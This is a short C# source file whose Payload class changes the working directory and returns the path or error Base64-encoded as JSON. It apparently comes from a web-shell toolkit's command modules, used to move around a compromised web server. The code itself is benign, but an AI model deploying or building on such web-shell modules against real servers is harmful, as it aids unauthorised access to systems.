using System;
using System.Web;
using System.IO;
using System.Text;
using System.Runtime.Serialization;

public class Payload{

    [DataContract]
    class Ret {

        [DataMember]
        public int code = 1;

        [DataMember]
        public string msg="";
    }
    Ret ret;
    public string Run(){
        ret = new Ret();
        Directory.SetCurrentDirectory(Global.pwd);
        try{
            Directory.SetCurrentDirectory(Global.path);
            ret.msg = Convert.ToBase64String(Encoding.UTF8.GetBytes(Directory.GetCurrentDirectory()));
        }catch(Exception e){
            ret.code = -1;
            ret.msg = Convert.ToBase64String(Encoding.UTF8.GetBytes(e.ToString()));
        }
        return Global.json_encode(ret);
    }
}